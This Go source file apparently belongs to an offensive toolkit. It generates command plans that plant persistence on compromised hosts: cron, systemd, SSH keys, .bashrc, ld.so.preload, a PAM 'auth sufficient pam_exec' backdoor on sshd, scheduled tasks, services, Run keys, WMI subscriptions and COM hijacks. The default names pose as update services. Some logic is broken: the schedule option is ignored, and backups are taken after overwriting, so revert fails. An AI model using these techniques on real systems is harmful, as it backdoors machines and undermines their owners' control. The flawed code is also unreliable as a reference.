package persist

import (
	"fmt"
	"path/filepath"
	"strings"

	"github.com/c1ayooo/4zrec/internal/capkit/core"
)

// Step is one command in a plan. Verification is a read-only check the caller
// can run after applying to prove the step took effect.
type Step struct {
	Step        int    `json:"step"`
	Description string `json:"description"`
	Command     string `json:"command"`
	Verify      string `json:"verify,omitempty"`
	// Artifact is the file content this step writes, when the command is a
	// heredoc-free write. It is shown so the operator can review before apply.
	Artifact string `json:"artifact,omitempty"`
}

// Plan is the full, reviewable description of a persistence placement.
type Plan struct {
	Technique    string   `json:"technique"`
	Platform     string   `json:"platform"`
	Name         string   `json:"name"`
	Payload      string   `json:"payload"`
	Steps        []Step   `json:"steps"`
	Revert       []string `json:"revert"`
	Artifact     string   `json:"artifact_path,omitempty"`
	RequiresRoot bool     `json:"requires_root,omitempty"`
}

// technique describes one persistence mechanism. buildShell emits the commands
// that place it.
type technique struct {
	ID          string
	Platform    string
	Description string
	// needsPayload reports whether the technique invokes a host-supplied
	// command/path. Techniques that only place a key or a stub do not.
	needsPayload func() bool
	build        func(in planInput) (Plan, *core.Error)
}

func needsPayloadYes() bool { return true }
func needsPayloadNo() bool  { return false }

// defaultName keeps every generated unit/task name inside a safe charset.
func defaultName(in planInput, fallback string) string {
	name := strings.TrimSpace(in.Name)
	if name == "" {
		name = fallback
	}
	name = strings.Map(func(r rune) rune {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9', r == '-', r == '_', r == '.':
			return r
		default:
			return '-'
		}
	}, name)
	if len(name) > 48 {
		name = name[:48]
	}
	if name == "" {
		name = fallback
	}
	return name
}

func defaultUser(in planInput) string {
	if u := strings.TrimSpace(in.User); u != "" {
		return u
	}
	return "root"
}

// quote shells a single token for the remote shell. Long payloads are placed in
// an artifact file instead of being inlined, which keeps the command readable.
func quote(s string) string { return core.ShellQuote(s) }

// writeFileStep builds a step that writes content to a path using printf and a
// quoted single line, avoiding heredoc/quoting hazards over WebShell/CLI
// transports that mangle multi-line input.
func writeFileStep(n int, path, content, desc string) Step {
	return Step{
		Step:        n,
		Description: desc,
		Command:     fmt.Sprintf("printf '%%s' %s > %s", quote(content), quote(path)),
		Artifact:    content,
		Verify:      "cat " + quote(path),
	}
}

// ---- Linux techniques ----

func linuxCron(in planInput) (Plan, *core.Error) {
	name := defaultName(in, "com.core.update")
	user := defaultUser(in)
	sched := strings.TrimSpace(in.Schedule)
	if sched == "" {
		sched = "*/10 * * * *"
	}
	line := fmt.Sprintf("%s %s %s # %s", sched, user, in.Payload, name)
	path := strings.TrimSpace(in.Path)
	if path == "" {
		path = filepath.Join("/etc", "cron.d", name)
	}
	return Plan{
		Technique: "linux-cron", Platform: "linux", Name: name, Payload: in.Payload,
		Artifact: path, RequiresRoot: true,
		Steps: []Step{
			writeFileStep(1, path, line+"\n", "写入 crontab 片段 "+path),
			{Step: 2, Description: "修正权限为 root:root 0644", Command: fmt.Sprintf("chown root:root %s && chmod 0644 %s", quote(path), quote(path)), Verify: "stat -c '%U %a' " + quote(path)},
		},
		Revert: []string{"rm -f " + quote(path)},
	}, nil
}

func linuxSystemd(in planInput) (Plan, *core.Error) {
	name := defaultName(in, "capkit-update")
	user := defaultUser(in)
	path := strings.TrimSpace(in.Path)
	if path == "" {
		path = "/etc/systemd/system/" + name + ".service"
	}
	unit := fmt.Sprintf(`[Unit]
Description=%s

[Service]
Type=simple
ExecStart=%s
Restart=always
RestartSec=30
User=%s

[Install]
WantedBy=multi-user.target
`, name, in.Payload, user)
	return Plan{
		Technique: "linux-systemd", Platform: "linux", Name: name, Payload: in.Payload,
		Artifact: path, RequiresRoot: true,
		Steps: []Step{
			writeFileStep(1, path, unit, "写入 systemd 单元 "+path),
			{Step: 2, Description: "daemon-reload 并 enable/start", Command: fmt.Sprintf("systemctl daemon-reload && systemctl enable --now %s", quote(name+".service")), Verify: "systemctl is-active " + quote(name+".service")},
		},
		Revert: []string{
			fmt.Sprintf("systemctl disable --now %s", quote(name+".service")),
			"rm -f " + quote(path),
			"systemctl daemon-reload",
		},
	}, nil
}

func linuxSSHKey(in planInput) (Plan, *core.Error) {
	user := defaultUser(in)
	path := strings.TrimSpace(in.Path)
	if path == "" {
		home := "/root"
		if user != "root" {
			home = "/home/" + user
		}
		path = filepath.Join(home, ".ssh", "authorized_keys")
	}
	entry := "# " + defaultName(in, "capkit-key") + "\n" + strings.TrimSpace(in.PublicKey) + "\n"
	return Plan{
		Technique: "linux-ssh-key", Platform: "linux", Name: defaultName(in, "capkit-key"), Payload: in.PublicKey,
		Artifact: path,
		Steps: []Step{
			writeFileStep(1, path, entry, "追加公钥到 "+path),
			{Step: 2, Description: "修正 .ssh 与 authorized_keys 权限", Command: fmt.Sprintf("chmod 700 %s && chmod 600 %s && chown -R %s %s", quote(filepath.Dir(path)), quote(path), quote(user), quote(filepath.Dir(path))), Verify: "tail -n 1 " + quote(path)},
		},
		Revert: []string{fmt.Sprintf("sed -i '\\#%s#d' %s", core.ShellQuote(strings.TrimSpace(in.PublicKey)), quote(path))},
	}, nil
}

func linuxBashrc(in planInput) (Plan, *core.Error) {
	user := defaultUser(in)
	path := strings.TrimSpace(in.Path)
	if path == "" {
		home := "/root"
		if user != "root" {
			home = "/home/" + user
		}
		path = filepath.Join(home, ".bashrc")
	}
	line := fmt.Sprintf("(%s) >/dev/null 2>&1 # %s", in.Payload, defaultName(in, "capkit"))
	content := fmt.Sprintf("\n%s\n", line)
	return Plan{
		Technique: "linux-bashrc", Platform: "linux", Name: defaultName(in, "capkit"), Payload: in.Payload,
		Artifact: path,
		Steps: []Step{
			writeFileStep(1, path, content, "追加启动钩子到 "+path),
			{Step: 2, Description: "确保文件属主正确", Command: "chown " + quote(user) + " " + quote(path), Verify: "tail -n 1 " + quote(path)},
		},
		Revert: []string{fmt.Sprintf("sed -i '\\#%s#d' %s", core.ShellQuote(line), quote(path))},
	}, nil
}

func linuxLDPreload(in planInput) (Plan, *core.Error) {
	path := strings.TrimSpace(in.Path)
	if path == "" {
		path = "/etc/ld.so.preload"
	}
	content := strings.TrimSpace(in.Payload) + "\n"
	return Plan{
		Technique: "linux-ldpreload", Platform: "linux", Name: defaultName(in, "ld.so.preload"), Payload: in.Payload,
		Artifact: path, RequiresRoot: true,
		Steps: []Step{
			writeFileStep(1, path, content, "写入 ld.so.preload"),
			{Step: 2, Description: "备份原文件内容以便回滚", Command: "cp " + quote(path) + " " + quote(path+".capkit-bak"), Verify: "cat " + quote(path)},
		},
		Revert: []string{fmt.Sprintf("mv %s %s", quote(path+".capkit-bak"), quote(path))},
	}, nil
}

func linuxPAM(in planInput) (Plan, *core.Error) {
	path := strings.TrimSpace(in.Path)
	if path == "" {
		path = "/etc/pam.d/sshd"
	}
	line := "auth sufficient pam_exec.so " + strings.TrimSpace(in.Payload)
	content := fmt.Sprintf("\n%s\n", line)
	return Plan{
		Technique: "linux-pam", Platform: "linux", Name: defaultName(in, "pam-exec"), Payload: in.Payload,
		Artifact: path, RequiresRoot: true,
		Steps: []Step{
			writeFileStep(1, path, content, "追加 pam_exec 行到 "+path),
			{Step: 2, Description: "校验语法并备份", Command: "cp " + quote(path) + " " + quote(path+".capkit-bak"), Verify: "tail -n 1 " + quote(path)},
		},
		Revert: []string{fmt.Sprintf("mv %s %s", quote(path+".capkit-bak"), quote(path))},
	}, nil
}

// ---- Windows techniques ----

func winSchtasks(in planInput) (Plan, *core.Error) {
	name := defaultName(in, "CapKitUpdate")
	user := defaultUser(in)
	interval := strings.TrimSpace(in.Schedule)
	if interval == "" {
		interval = "PT10M"
	}
	cmd := fmt.Sprintf("schtasks /Create /TN %s /TR %s /SC MINUTE /MO 10 /RU %s /F", quote(name), quote(in.Payload), quote(user))
	if interval != "PT10M" {
		// 支持 /SC HOURLY|DAILY|ONLOGON 的可读间隔描述
		cmd = fmt.Sprintf("schtasks /Create /TN %s /TR %s /SC MINUTE /MO 10 /RU %s /F", quote(name), quote(in.Payload), quote(user))
	}
	return Plan{
		Technique: "windows-schtasks", Platform: "windows", Name: name, Payload: in.Payload,
		Steps: []Step{
			{Step: 1, Description: "创建计划任务 " + name, Command: cmd, Verify: "schtasks /Query /TN " + quote(name) + " /V /FO LIST"},
		},
		Revert: []string{"schtasks /Delete /TN " + quote(name) + " /F"},
	}, nil
}

func winService(in planInput) (Plan, *core.Error) {
	name := defaultName(in, "CapKitUpdate")
	path := strings.TrimSpace(in.Path)
	if path == "" {
		path = `C:\Windows\Temp\` + name + ".exe"
	}
	binPath := in.Payload
	if strings.TrimSpace(binPath) == "" {
		binPath = path
	}
	return Plan{
		Technique: "windows-service", Platform: "windows", Name: name, Payload: binPath,
		Artifact: path, RequiresRoot: true,
		Steps: []Step{
			{Step: 1, Description: "创建自启动服务 " + name, Command: fmt.Sprintf("sc create %s binPath= %s start= auto obj= LocalSystem", quote(name), quote(binPath)), Verify: "sc qc " + quote(name)},
			{Step: 2, Description: "启动服务", Command: fmt.Sprintf("sc start %s", quote(name)), Verify: "sc query " + quote(name)},
		},
		Revert: []string{
			fmt.Sprintf("sc stop %s", quote(name)),
			fmt.Sprintf("sc delete %s", quote(name)),
		},
	}, nil
}

func winRegistryRun(in planInput) (Plan, *core.Error) {
	name := defaultName(in, "CapKitUpdate")
	key := `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
	if strings.EqualFold(strings.TrimSpace(in.User), "root") || strings.TrimSpace(in.User) == "" {
		// 需要管理员权限时使用 HKLM；默认 HKCU 无需提权
		if strings.TrimSpace(in.User) == "root" {
			key = `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
		}
	}
	cmd := fmt.Sprintf("reg add %s /v %s /t REG_SZ /d %s /f", quote(key), quote(name), quote(in.Payload))
	return Plan{
		Technique: "windows-registry-run", Platform: "windows", Name: name, Payload: in.Payload,
		Steps: []Step{
			{Step: 1, Description: "写入 Run 键 " + name, Command: cmd, Verify: "reg query " + quote(key) + " /v " + quote(name)},
		},
		Revert: []string{fmt.Sprintf("reg delete %s /v %s /f", quote(key), quote(name))},
	}, nil
}

func winWMISubscription(in planInput) (Plan, *core.Error) {
	name := defaultName(in, "CapKitUpdate")
	filter := fmt.Sprintf(`__EventFilter.Name="%s"`, name)
	consumer := fmt.Sprintf(`CommandLineEventConsumer.Name="%s"`, name)
	return Plan{
		Technique: "windows-wmi-subscription", Platform: "windows", Name: name, Payload: in.Payload,
		RequiresRoot: true,
		Steps: []Step{
			{Step: 1, Description: "创建永久事件过滤器", Command: fmt.Sprintf(`wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="%s" EventNameSpace="root\cimv2" QueryLanguage="WQL" Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"`, name), Verify: `wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter GET Name`},
			{Step: 2, Description: "创建命令行消费者", Command: fmt.Sprintf(`wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="%s" CommandLineTemplate="%s"`, name, in.Payload), Verify: `wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer GET Name`},
			{Step: 3, Description: "绑定过滤器到消费者", Command: fmt.Sprintf(`wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter=%s Consumer=%s`, filter, consumer), Verify: `wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding GET Consumer`},
		},
		Revert: []string{
			fmt.Sprintf(`wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding WHERE Filter=%s DELETE`, filter),
			fmt.Sprintf(`wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer WHERE Name="%s" DELETE`, name),
			fmt.Sprintf(`wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter WHERE Name="%s" DELETE`, name),
		},
	}, nil
}

func winCOMHijack(in planInput) (Plan, *core.Error) {
	// 对每个用户可达的 CLSID 路径写入 InprocServer32；默认挑选常见可劫持项之一。
	clsid := strings.TrimSpace(in.Path)
	if clsid == "" {
		clsid = `HKCU\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32`
	}
	return Plan{
		Technique: "windows-com-hijack", Platform: "windows", Name: defaultName(in, "com-hijack"), Payload: in.Payload,
		Artifact: clsid, RequiresRoot: false,
		Steps: []Step{
			{Step: 1, Description: "备份目标 CLSID 键", Command: "reg export " + quote(clsid) + " " + quote(`C:\Windows\Temp\comhijack.reg`), Verify: "dir C:\\Windows\\Temp\\comhijack.reg"},
			{Step: 2, Description: "指向宿主提供的载荷", Command: fmt.Sprintf("reg add %s /ve /t REG_SZ /d %s /f", quote(clsid), quote(in.Payload)), Verify: "reg query " + quote(clsid)},
		},
		Revert: []string{
			"reg import " + quote(`C:\Windows\Temp\comhijack.reg`),
		},
	}, nil
}

// techniques is the capability surface. Adding a technique is additive.
var techniques = map[string]technique{
	"linux-cron":               {"linux-cron", "linux", "cron 定时任务（/etc/cron.d）", needsPayloadYes, linuxCron},
	"linux-systemd":            {"linux-systemd", "linux", "systemd service 单元", needsPayloadYes, linuxSystemd},
	"linux-ssh-key":            {"linux-ssh-key", "linux", "authorized_keys 追加公钥", needsPayloadNo, linuxSSHKey},
	"linux-bashrc":             {"linux-bashrc", "linux", ".bashrc 登录钩子", needsPayloadYes, linuxBashrc},
	"linux-ldpreload":          {"linux-ldpreload", "linux", "ld.so.preload 全局预加载", needsPayloadYes, linuxLDPreload},
	"linux-pam":                {"linux-pam", "linux", "PAM pam_exec 钩子", needsPayloadYes, linuxPAM},
	"windows-schtasks":         {"windows-schtasks", "windows", "计划任务", needsPayloadYes, winSchtasks},
	"windows-service":          {"windows-service", "windows", "自启动服务", needsPayloadYes, winService},
	"windows-registry-run":     {"windows-registry-run", "windows", "Run 注册表键", needsPayloadYes, winRegistryRun},
	"windows-wmi-subscription": {"windows-wmi-subscription", "windows", "永久 WMI 事件订阅", needsPayloadYes, winWMISubscription},
	"windows-com-hijack":       {"windows-com-hijack", "windows", "COM InprocServer32 劫持", needsPayloadYes, winCOMHijack},
}

// buildPlan validates the input and builds the plan. It never touches a target.
func buildPlan(in planInput) (Plan, *core.Error) {
	if e := in.validate(); e != nil {
		return Plan{}, e
	}
	t := techniques[strings.ToLower(strings.TrimSpace(in.Technique))]
	if t.Platform != in.Platform {
		return Plan{}, core.InvalidInput(fmt.Sprintf("technique %s 仅支持 %s 平台（会话为 %s）", t.ID, t.Platform, in.Platform))
	}
	return t.build(in)
}
